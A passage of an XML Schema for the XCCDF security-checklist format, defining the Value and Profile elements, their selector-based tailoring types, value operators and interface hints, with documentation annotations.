            <xsd:selector xpath="./cdf:value|cdf:complex-value"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="defaultSelectorKey">
            <xsd:selector xpath="./cdf:default|cdf:complex-default"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="matchSelectorKey">
            <xsd:selector xpath="./cdf:match"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="lower-boundSelectorKey">
            <xsd:selector xpath="./cdf:lower-bound"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="upper-boundSelectorKey">
            <xsd:selector xpath="./cdf:upper-bound"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="choicesSelectorKey">
            <xsd:selector xpath="./cdf:choices"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
    </xsd:element>

    <xsd:complexType name="valueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Value&gt; element, which
                is a named parameter that can be substituted into properties of other elements
                within the &lt;xccdf:Benchmark&gt;, including the interior of structured check
                specifications and fix scripts. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:itemType">
                <xsd:sequence>
                    <xsd:choice minOccurs="1" maxOccurs="unbounded">
                        <xsd:element name="value" type="cdf:selStringType" minOccurs="1"
                            maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">A simple (number, string, or
                                    boolean) value associated with this &lt;xccdf:Value&gt;. At any
                                    time an &lt;xccdf:Value&gt; has one active (simple or complex)
                                    value. If a selector value has been provided under
                                    &lt;xccdf:Profile&gt; selection or tailoring then the active
                                    &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; is the one with
                                    a matching @selector. If there is no provided selector or if the
                                    provided selector does not match the @selector attribute of any
                                    &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt;, the active
                                    &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; is the one with
                                    an empty or absent @selector or, failing that, the first
                                    &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; in the XML.
                                    When an &lt;xccdf:Value&gt; is exported or used in text
                                    substitution, it is the currently active &lt;xccdf:value&gt; or
                                    &lt;xccdf:complex-value&gt; that is actually used. If there are
                                    multiple &lt;xccdf:value&gt; and/or &lt;xccdf:complex-value&gt;
                                    elements, only one may omit a @selector attribute and no two may
                                    have the same @selector value.</xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element name="complex-value" type="cdf:selComplexValueType"
                            minOccurs="1" maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">A complex (list) value associated
                                    with this &lt;xccdf:Value&gt;. See the description of the
                                    &lt;xccdf:value&gt; property for &lt;xccdf:Rule&gt; elements
                                    regarding activation of an &lt;xccdf:complex-value&gt;.
                                </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:choice minOccurs="0" maxOccurs="unbounded">
                        <xsd:element name="default" type="cdf:selStringType" minOccurs="1"
                            maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">The default value displayed to the
                                    user as a suggestion by benchmark producers during tailoring of
                                    this &lt;xccdf:Value&gt; element. (This is not the default value
                                    of an &lt;xccdf:Value&gt;; it is just the default display.) If
                                    there are multiple &lt;xccdf:default&gt; and/or
                                    &lt;xccdf:complex-default&gt; elements, only one may omit a
                                    @selector attribute and no two may have the same @selector
                                    value. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element name="complex-default" type="cdf:selComplexValueType"
                            minOccurs="1" maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">The default
                                    &lt;xccdf:complex-value&gt; displayed to the user as a
                                    suggestion by benchmark producers during tailoring of this
                                    &lt;xccdf:Value&gt; element. (This is not the default value of
                                    an &lt;xccdf:Value&gt;; it is just the default display.) If
                                    there are multiple &lt;xccdf:default&gt; and
                                    &lt;xccdf:complex-default&gt; elements, only one may omit a
                                    @selector attribute and no two may have the same @selector
                                    value. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:element name="match" type="cdf:selStringType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A Perl Compatible Regular Expression
                                that a benchmark producer may apply during tailoring to validate a
                                user’s input for the &lt;xccdf:Value&gt;. It uses implicit
                                anchoring. It applies only when the @type property is “string” or
                                “number” or a list of strings and/or numbers.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="lower-bound" type="cdf:selNumType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Minimum legal value for this
                                &lt;xccdf:Value&gt;. It is used to constrain value input during
                                tailoring, when the @type property is “number”. Values supplied by
                                the user for tailoring the &lt;xccdf:Benchmark&gt; must be equal to
                                or greater than this number. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="upper-bound" type="cdf:selNumType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Maximum legal value for this
                                &lt;xccdf:Value&gt;. It is used to constrain value input during
                                tailoring, when the @type is “number”. Values supplied by the user
                                for tailoring the &lt;xccdf:Benchmark&gt; must be less than or equal
                                to than this number. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="choices" type="cdf:selChoicesType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A list of legal or suggested choices
                                (values) for an &lt;xccdf:Value&gt; element, to be used during
                                tailoring and document generation. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="source" type="cdf:uriRefType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">URI indicating where the tool may
                                acquire values, value bounds, or value choices for this
                                &lt;xccdf:Value&gt; element. XCCDF does not attach any meaning to
                                the URI; it may be an arbitrary community or tool-specific value, or
                                a pointer directly to a resource. If several instances of the
                                &lt;xccdf:source&gt; property appear, then they represent
                                alternative means or locations for obtaining the value in descending
                                order of preference (i.e., most preferred first).
                            </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="signature" type="cdf:signatureType" minOccurs="0"
                        maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A digital signature asserting
                                authorship and allowing verification of the integrity of the
                                &lt;xccdf:Value&gt;. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="id" type="cdf:valueIdType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The unique identifier for this element.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="type" type="cdf:valueTypeType" default="string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The data type of the &lt;xccdf:Value&gt;. A
                            tool may choose any convenient form to store an &lt;xccdf:Value&gt;
                            element’s &lt;xccdf:value&gt; element, but the @type attribute conveys
                            how the &lt;xccdf:Value&gt; should be treated for user input validation
                            purposes during tailoring processing. The @type attribute may also be
                            used to give additional guidance to the user or to validate the user’s
                            input. In the case of a list of values, the @type attribute, if present,
                            applies to all elements of the list individually.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="operator" type="cdf:valueOperatorType" default="equals"
                    use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The operator to be used for comparing this
                            &lt;xccdf:Value&gt; to some part of the test system’s configuration
                            during &lt;xccdf:Rule&gt; checking. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="interactive" type="xsd:boolean" default="0" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Whether tailoring for this
                            &lt;xccdf:Value&gt; should be performed during &lt;xccdf:Benchmark&gt;
                            application. The benchmark consumer may ignore the attribute if asking
                            the user is not feasible or not supported.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="interfaceHint" use="optional" type="cdf:interfaceHintType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A hint or recommendation to a benchmark
                            consumer or producer about how the user might select or adjust the
                            &lt;xccdf:Value&gt;. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- ***************  Value-related Types  ************************ -->
    <!-- ************************************************************** -->
    <xsd:complexType name="complexValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type that supports values that are lists of simple
                types. Each element in the list is represented by an instance of the
                &lt;xccdf:item&gt; child element. If there are no &lt;xccdf:item&gt; child elements
                then this represents an empty list. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="item" minOccurs="0" maxOccurs="unbounded" type="xsd:string">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A single item in the list of values.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="selComplexValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type that supports values that are lists of
                simple types with an associated @selector attribute used in tailoring.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:complexValueType">
                <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">This may be referenced from
                            &lt;xccdf:Profile&gt; selection elements or used during manual tailoring
                            to refine the application of this property. If no selectors are
                            specified for a given item by &lt;xccdf:Profile&gt; elements or manual
                            tailoring, properties with empty or non-existent @selector attributes
                            are activated. If a selector is applied that does not match the
                            @selector attribute of any of a given type of property, then no
                            &lt;xccdf:choices&gt; element is considered activated. The only
                            exception is the &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt;
                            properties of an &lt;xccdf:Value&gt; element - if there is no
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; property with a
                            matching @selector value then the
                            &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; property with an empty
                            or absent @selector attribute becomes active. If there is no such
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt;, then the first
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; listed becomes
                            active. This reflects the fact that all &lt;xccdf:Value&gt; elements
                            require an active value property at all times.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="selChoicesType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type of the &lt;xccdf:choice&gt; element, which
                specifies a list of legal or suggested choices for an &lt;xccdf:Value&gt; object.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="1" maxOccurs="unbounded">
            <xsd:element name="choice" type="xsd:string" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A single choice holding a simple type. (I.e.,
                        number, string, or boolean.) </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="complex-choice" type="cdf:complexValueType" minOccurs="1"
                maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A single choice holding a list of simple
                        types.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:choice>
        <xsd:attribute name="mustMatch" type="xsd:boolean" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">True if the listed choices are the only permissible
                    settings for the given &lt;xccdf:Value&gt;. False if choices not specified in
                    this &lt;xccdf:choices&gt; element are acceptable settings for this
                    &lt;xccdf:Value&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">This may be referenced from &lt;xccdf:Profile&gt;
                    selection elements or used during manual tailoring to refine the application of
                    the &lt;xccdf:Rule&gt;. If no selectors are specified for a given
                    &lt;xccdf:Value&gt; by &lt;xccdf:Profile&gt; elements or manual tailoring, an
                    &lt;xccdf:choice&gt; element with an empty or non-existent @selector attribute
                    is activated. If a selector is applied that does not match the @selector
                    attribute of any &lt;xccdf:choices&gt; element, then no &lt;xccdf:choices&gt;
                    element is considered activated.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="selStringType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type is for an element that has string content
                and a @selector attribute for use in tailoring. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">This may be referenced from
                            &lt;xccdf:Profile&gt; selection elements or used during manual tailoring
                            to refine the application of this property. If no selectors are
                            specified for a given property by &lt;xccdf:Profile&gt; elements or
                            manual tailoring, properties with empty or non-existent @selector
                            attributes are activated. If a selector is applied that does not match
                            the @selector attribute of any of a given type of property, then no
                            property of that type is considered activated. The only exception is the
                            &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt; properties of an
                            &lt;xccdf:Value&gt; element - if there is no &lt;xccdf:value&gt; or
                            &lt;xccdf:complex-value&gt; property with a matching @selector value
                            then the &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; property with
                            an empty or absent @selector attribute becomes active. If there is no
                            such &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt;, then the first
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; listed in the XML
                            becomes active. This reflects the fact that all &lt;xccdf:Value&gt;
                            elements require an active value property at all
                            times.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="selNumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type is for an element that has numeric content
                and a @selector attribute for use during tailoring. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:decimal">
                <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">This may be referenced from
                            &lt;xccdf:Profile&gt; selection elements or used during manual tailoring
                            to refine the application of this property. If no selectors are
                            specified for a given property by &lt;xccdf:Profile&gt; elements or
                            manual tailoring, properties with empty or non-existent @selector
                            attributes are activated. If a selector is applied that does not match
                            the @selector attribute of any of a given type of property, then no
                            property of that type considered activated. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="uriRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for elements that have no content and a
                single @uri attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="uri" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A URI.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:simpleType name="valueTypeType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed data types for &lt;xccdf:Value&gt; elements,
                string, numeric, and boolean. A tool may choose any convenient form to store an
                &lt;xccdf:Value&gt; element’s &lt;xccdf:value&gt; element, but the @type conveys how
                the value should be treated for user input validation purposes during tailoring
                processing. The @type may also be used to give additional guidance to the user or to
                validate the user’s input. For example, if an &lt;xccdf:value&gt; element’s @type
                attribute is “number”, then a tool might choose to reject user tailoring input that
                is not composed of digits. In the case of a list of values, the @type applies to all
                elements of the list individually. Note that checking systems may have their own
                understanding of data types that may not be identical to the typing indicated in
                XCCDF </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="number">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A numeric value. This may be decimal or
                        integer.</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="string">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Any character data</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="boolean">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">True/false</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="valueOperatorType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type enumerates allowed values of the @operator
                property of &lt;xccdf:Value&gt; elements. The specific interpretation of these
                operators depends on the checking system used. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="equals"/>
            <xsd:enumeration value="not equal"/>
            <xsd:enumeration value="greater than"/>
            <xsd:enumeration value="less than"/>
            <xsd:enumeration value="greater than or equal"/>
            <xsd:enumeration value="less than or equal"/>
            <xsd:enumeration value="pattern match"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="interfaceHintType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed interface hint values. &lt;xccdf:Value&gt;
                elements may contain a hint or recommendation to a benchmark consumer or producer
                about how the user might select or adjust the &lt;xccdf:Value&gt;. This type
                enumerates the possible values of this hint.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="choice">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Multiple choice</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="textline">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Multiple lines of text</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="text">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Single line of text</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="date">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Date</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="datetime">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Date and time</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <!-- ************************************************************** -->
    <!-- *******************  Profile Element  ************************ -->
    <!-- ************************************************************** -->
    <xsd:element name="Profile" type="cdf:profileType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:Profile&gt; element is a named tailoring
                for an &lt;xccdf:Benchmark&gt;. While an &lt;xccdf:Benchmark&gt; can be tailored in
                place by setting properties of various elements, &lt;xccdf:Profile&gt; elements
                allow one &lt;xccdf:Benchmark&gt; document to hold several independent
                tailorings.</xsd:documentation>
        </xsd:annotation>
        <!-- selector key constraints -->
        <xsd:unique name="itemSelectKey">
            <xsd:selector xpath="./cdf:select"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
        <xsd:unique name="refineRuleKey">
            <xsd:selector xpath="./cdf:refine-rule"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
        <xsd:unique name="refineValueKey">
            <xsd:selector xpath="./cdf:refine-value"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
        <xsd:unique name="setValueKey">
            <xsd:selector xpath="./cdf:set-value"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
    </xsd:element>

    <xsd:complexType name="profileType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Profile&gt; element, which
                holds a specific tailoring of the &lt;xccdf:Benchmark&gt;. The main part of an
                &lt;xccdf:Profile&gt; is the selectors: &lt;xccdf:select&gt;,
                &lt;xccdf:set-value&gt;, &lt;xccdf:set-complex-value&gt;, &lt;xccdf:refine-rule&gt;,
                and &lt;xccdf:refine-value&gt;. An &lt;xccdf:Profile&gt; may also be signed with an
                XML-Signature. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element ref="cdf:status" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Status of the &lt;xccdf:Profile&gt; and date at
                        which it attained that status. Authors may use this element to record the
                        maturity or consensus level of an &lt;xccdf:Profile&gt;. If the
                        &lt;xccdf:status&gt; is not given explicitly, then the &lt;xccdf:Profile&gt;
                        is taken to have the same status as its parent
                        &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                type="cdf:dc-statusType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds additional status information using the
                        Dublin Core format.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="version" type="cdf:versionType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Version information about this
                        &lt;xccdf:Profile&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="title" type="cdf:textWithSubType" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Title of the &lt;xccdf:Profile&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="description" type="cdf:htmlTextWithSubType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Text that describes the &lt;xccdf:Profile&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="reference" type="cdf:referenceType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A reference where the user can learn more about
                        the subject of this &lt;xccdf:Profile&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="platform" type="cdf:overrideableCPE2idrefType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A target platform for this
                        &lt;xccdf:Profile&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice minOccurs="0" maxOccurs="unbounded">
                <xsd:element name="select" minOccurs="0" type="cdf:profileSelectType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Select or deselect &lt;xccdf:Group&gt; and
                            &lt;xccdf:Rule&gt; elements. </xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="set-complex-value" minOccurs="0"
                    type="cdf:profileSetComplexValueType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Set the value of an &lt;xccdf:Value&gt; to
                            a list.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="set-value" minOccurs="0" type="cdf:profileSetValueType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Set the value of an &lt;xccdf:Value&gt; to
                            a simple data value.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="refine-value" minOccurs="0" type="cdf:profileRefineValueType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Customize the properties of an
                            &lt;xccdf:Value&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="refine-rule" minOccurs="0" type="cdf:profileRefineRuleType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Customize the properties of an
                            &lt;xccdf:Rule&gt; or &lt;xccdf:Group&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:choice>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Metadata associated with this
                        &lt;xccdf:Profile&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A digital signature asserting authorship and
                        allowing verification of the integrity of the
                        &lt;xccdf:Profile&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="id" type="cdf:profileIdType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this
                    &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="prohibitChanges" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Whether or not products should prohibit changes to
                    this &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="abstract" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If true, then this &lt;xccdf:Profile&gt; exists
                    solely to be extended by other &lt;xccdf:Profile&gt; elements.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="note-tag" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Tag identifier to specify which
                    &lt;xccdf:profile-note&gt; element from an &lt;xccdf:Rule&gt; should be
                    associated with this &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="extends" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The id of an &lt;xccdf:Profile&gt; on which to base
                    this &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:base"/>
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- ***************  Profile-related Types *********************** -->
    <!-- ************************************************************** -->
    <xsd:complexType name="profileSelectType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:select&gt; element in an
                &lt;xccdf:Profile&gt;. This element designates an &lt;xccdf:Rule&gt;,
                &lt;xccdf:Group&gt;, or cluster of &lt;xccdf:Rule&gt; and &lt;xccdf:Group&gt;
                elements and overrides the @selected attribute on the designated items, providing a
                means for including or excluding &lt;xccdf:Rule&gt; elements from an
                assessment.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Explanatory material or other
                        prose.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Rule&gt; or
                    &lt;xccdf:Group&gt;, or the @cluster-id value of one or more &lt;xccdf:Rule&gt;
                    or &lt;xccdf:Group&gt; elements. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selected" type="xsd:boolean" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the indicated item's @selected
                    property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="profileSetValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:set-value&gt; element in an
                &lt;xccdf:Profile&gt;. This element upports the direct specification of simple value
                types such as numbers, strings, and boolean values. This overrides the
                &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt; element(s) of an
                &lt;xccdf:Value&gt; element.</xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="idref" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Value&gt; or
                            the @cluster-id value of one or more &lt;xccdf:Value&gt; elements
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="profileSetComplexValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:set-complex-value&gt; element
                in an &lt;xccdf:Profile&gt;. This element supports the direct specification of
                complex value types such as lists. Zero or more &lt;xccdf:item&gt; elements may
                appear as children of this element; if no child elements are present, this element
                represents an empty list. This overrides the &lt;xccdf:value&gt; and
                &lt;xccdf:complex-value&gt; element(s) of an &lt;xccdf:Value&gt;
                element.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:complexValueType">
                <xsd:attribute name="idref" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Value&gt; or
                            the @cluster-id value of one or more &lt;xccdf:Value&gt; elements
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="profileRefineValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:refine-value&gt; element in an
                &lt;xccdf:Profile&gt;. This element designates the &lt;xccdf:Value&gt; constraints
                to be applied during tailoring for an &lt;xccdf:Value&gt; element or the
                &lt;xccdf:Value&gt; members of a cluster. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Explanatory material or other
                        prose.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
